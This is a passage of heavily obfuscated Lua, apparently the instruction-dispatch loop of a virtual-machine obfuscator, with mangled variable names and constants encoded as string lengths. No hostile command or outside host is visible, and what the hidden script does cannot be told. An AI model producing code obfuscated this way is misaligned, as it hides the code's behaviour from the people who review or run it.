a_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ja")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6X1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jPmX")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{15;893;174;343};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C8dn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{158;428;722;471};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("lIx6")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("c8W")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{25;360;710;969};"1 + 1 = 111";{959;332;416;132};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DV")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sT1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JFMO")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("EQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("scF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2c82")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rCV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("s0vh")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q2b")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("f2L9")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{238;218;151;866};{882;805;345;213};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("UQ8")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{52;322;735;167};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LjO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("PHm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uf")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("vaa")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uN")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4PL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Ge0s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("I7v")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{80;966;9;903};{234;142;454;834};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sBU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OdJF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZIz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("z9l7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pB8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("umpM")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("eW")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("9OL")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6Q")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("e82")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZMe")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("UFoW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("B8Z")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("c1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fi")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("ueZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("ki")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Avc")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("i9M")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6qiT")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("hvS")then local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S7")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bPX")]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("XlQY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("eCU")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("W7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0g")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fKe")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cYH0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{823;238;466;75};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vD0")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ctfK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gy")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ty5")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("LP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{647;510;25;986};"1 + 1 = 111";{787;479;595;254};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{543;270;225;247};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZBT")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hCqO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("mD")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bn")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5VN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tZou")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("K6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ajp")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Nbpv")];else if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nQ")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("x5ZT")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("kJ6")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("UP7V5q7")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vj69V")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eo")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DcS")];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("cNDrxX")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("A3")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ajY")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ntx0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Gly")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("VH")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dKf")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{398;714;8;840};"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P2B")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("GPz5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pJ")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("BAPh")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SbN")];end;else if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bY")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("EaEk")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("6oQ")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("As4UH7Zp")then local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("cG")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("neQ")]))elseif ajefa_IIIlIllIllllIIllIlllIIll>#("nWrAxSC8o")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ku")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("87vG")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("CgJ")];end;else ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Do4")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4p")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("4LmoPDDOu82Z85O")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vdayshoa6jSu")then if ajefa_IIIlIllIllllIIllIlllIIll==#("ulFd92Lndpq")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gs")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NWm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("aJlG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kb")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("y2W")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ql")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("eyh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("isg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gFv8")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zyY")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YfB2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WE")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DMT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fns")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nxhb")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("arz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("xBPq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("8c")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("7Va")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oo")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y26")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5p")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("p80v")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mp")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("6yb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0x")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("agy")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KK")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 